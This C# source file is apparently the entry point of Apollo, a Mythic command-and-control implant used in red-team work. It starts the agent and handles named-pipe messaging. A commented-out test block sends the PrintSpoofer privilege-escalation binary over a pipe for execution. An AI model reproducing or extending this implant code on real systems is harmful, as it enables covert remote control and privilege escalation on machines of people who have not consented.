using System;
using PSKCryptography;
using HttpTransport;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Structs.MythicStructs;
using Apollo.Agent;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using System.Text;
using System.Threading;
using Apollo.Peers.SMB;
using System.Linq;
using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Enums.ApolloEnums;
using System.Diagnostics;

namespace Apollo
{
    class Program
    {
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> _receiverQueue = new ConcurrentQueue<IMythicMessage>();
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private static AutoResetEvent _connected = new AutoResetEvent(false);
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static Action<object> _sendAction;
        private static CancellationTokenSource _cancellationToken = new CancellationTokenSource();
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static AutoResetEvent _complete  = new AutoResetEvent(false);
        private static bool _completed;
        private static Action<object> _flushMessages;

        public static void Main(string[] args)
        {
            //_sendAction = (object p) =>
            //{
            //    PipeStream ps = (PipeStream)p;
            //    while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
            //    {
            //        WaitHandle.WaitAny(new WaitHandle[]
            //        {
            //        _senderEvent,
            //        _cancellationToken.Token.WaitHandle
            //        });
            //        if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
            //        {
            //            ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
            //        }
            //    }
            //    ps.Close();
            //    _complete.Set();
            //};

            //AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", "exetest");
            //client.ConnectionEstablished += Client_ConnectionEstablished;
            //client.MessageReceived += OnAsyncMessageReceived;
            //client.Disconnect += Client_Disconnect;
            //IPCCommandArguments cmdargs = new IPCCommandArguments
            //{
            //    ByteData = System.IO.File.ReadAllBytes(@"C:\PrintSpoofer\x64\Release\PrintSpoofer.exe"),
            //    StringData = "PrintSpoofer.exe --help"
            //};
            //if (client.Connect(3000))
            //{
            //    IPCChunkedData[] chunks = _jsonSerializer.SerializeIPCMessage(cmdargs);
            //    foreach (IPCChunkedData chunk in chunks)
            //    {
            //        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(chunk)));
            //    }
            //    _senderEvent.Set();
            //    WaitHandle.WaitAny(new WaitHandle[]
            //    {
            //                                    _complete,
            //                                    _cancellationToken.Token.WaitHandle
            //    });
            //}
            //else
            //{
            //    Debugger.Break();
            //}

            // This is main execution.
            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
            ap.Start();
        }

        private static void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _complete.Set();
        }

        private static void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected)
            {
                pipe.EndWrite(result);
                if (!_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] bdata))
                {
                    pipe.BeginWrite(bdata, 0, bdata.Length, OnAsyncMessageSent, pipe);
                }
            }
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCData d = args.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            Console.Write(msg);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _receiverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }
    }
}
